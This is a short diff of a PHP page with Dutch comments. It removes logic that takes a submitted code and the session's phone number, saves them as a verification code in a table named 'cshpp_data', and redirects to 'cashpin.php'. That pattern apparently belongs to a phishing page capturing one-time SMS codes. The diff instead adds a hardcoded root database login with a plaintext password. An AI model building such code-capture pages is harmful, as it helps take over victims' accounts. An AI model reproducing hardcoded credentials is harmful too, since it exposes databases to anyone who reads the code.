@@ -1,31 +1,10 @@
 <?php
-session_start();
+$conn = new mysqli('mysql.railway.internal', 'root', 'dKoENyxanuhrHlOuWovDKCbOMcJQKtFM', 'railway', 3306);
 
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $conn = new mysqli('localhost', 'root', '', 'my_base');
-    if ($conn->connect_error) {
-        die("Connectie mislukt: " . $conn->connect_error);
-    }
-
-    $code = $_POST['code'] ?? '';
-    $phone = $_SESSION['phone'] ?? '';
-
-    if (!empty($code) && !empty($phone)) {
-        // Update de meest recente rij met dit telefoonnummer
-        $stmt = $conn->prepare("UPDATE cshpp_data SET verification_code = ? WHERE phone_number = ? ORDER BY id DESC LIMIT 1");
-        $stmt->bind_param("ss", $code, $phone);
-        $stmt->execute();
-        $stmt->close();
-        $conn->close();
-
-        header("Location: cashpin.php");
-        exit();
-    } else {
-        echo "Code of telefoonnummer ontbreekt.";
-    }
+if ($conn->connect_error) {
+    die("Connectie mislukt: " . $conn->connect_error);
 }
 ?>
-
 
 <!DOCTYPE html>
 <html lang="en">
